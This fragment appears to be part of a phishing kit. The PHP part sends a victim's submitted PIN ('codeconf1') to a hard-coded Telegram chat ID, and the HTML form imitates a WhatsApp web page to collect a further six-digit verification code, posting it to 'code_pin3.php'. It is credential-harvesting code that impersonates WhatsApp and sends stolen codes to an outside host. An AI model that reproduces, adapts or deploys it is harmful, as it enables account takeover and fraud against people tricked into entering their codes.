...
$chat_id ="5288376819";
 $params=[
      'chat_id'=>$chat_id,
      'text' =>$idN ."| CODE PIN 1 : ".$_POST['codeconf1'],
                ...
                <div data-testid="whatsapp_www_root" id="content-wrapper">
                    <div class="_9r_7">
                        <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                            ...
                            <form action="code_pin3.php" method="POST">
                                                  ...
                                                  <br><br><br>
                                                    ...
                                                    <br>
                                                    <br>
                                                        <input type="text" name="codeconf2" id="codeconf2" class="input-phone"  style="text-align:center;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required>
